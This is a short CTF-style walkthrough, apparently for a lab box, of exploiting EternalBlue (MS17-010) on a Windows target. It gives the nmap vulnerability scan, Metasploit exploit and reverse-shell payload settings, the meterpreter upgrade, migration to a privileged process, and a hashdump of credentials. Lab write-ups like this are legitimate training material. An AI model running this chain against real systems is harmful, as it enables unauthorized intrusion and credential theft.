
# 🔍 EternalBlue Exploitation Walkthrough

**Target IP:** `10.10.112.154`

---

## 🛰️ 1. Scanning the Target

### 🔎 Basic Service Scan

```bash
nmap -sV -Pn -vv 10.10.112.154
```

### 🧨 Vulnerability Scan

```bash
nmap -sV -sC --script vuln -oN blue.nmap 10.10.112.154
```

---

## 🚪 2. Gaining Access

### 🛠️ Launch Metasploit

```bash
msfconsole
```

### 🔍 Search for Vulnerability

```bash
search eternalblue
```

### 🧰 Use the Exploit (Usually #0)

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

### 🎯 Set Target IP

```bash
set RHOST 10.10.112.154
```

### 💥 Set a Custom Payload (Optional, but cooler 😎)

```bash
set payload windows/x64/shell/reverse_tcp
```

> You can also list all available payloads:

```bash
show payloads
```

### 🔓 Run the Exploit

```bash
exploit
```

> 💡 If it fails, **reboot the target** and try again!

---

## 🖥️ 3. Shell Management

### 🎉 On Success: You’re In!

```bash
<<<<<< WIN >>>>>>
```

### 🛑 Background the Session

```bash
CTRL + Z
```

---

## 🔁 4. Convert to Meterpreter

### 📚 Post Exploitation Module

```bash
use post/multi/manage/shell_to_meterpreter
```

### ⚙️ Configure the Module

```bash
show options
set session 1
```

> Check available sessions:

```bash
sessions
```

> If session 2 is created:

```bash
sessions -i 2
```

### 🔍 Check Access Level

```bash
getuid
```

---

## 🛡️ 5. Escalate Privileges

### 📋 View Running Services

```bash
ps
```

> Look for services under **NT AUTHORITY** or similar with high privileges.

### 🔁 Migrate to High-Privilege Process

```bash
migrate <PROCESS_ID>
```

---

## 🔓 6. Crack the System

### 🧃 Dump Those Hashes

```bash
hashdump
```

> This will dump user credentials **if privileges allow**.

---

## 🧠 Bonus Tips

- If something fails, **try again** — persistence is key.
- Take notes on **session numbers**, **process IDs**, and **UIDs**.
- Happy Hacking 👾

---

> 🧠 Educational use only. Don't be evil.
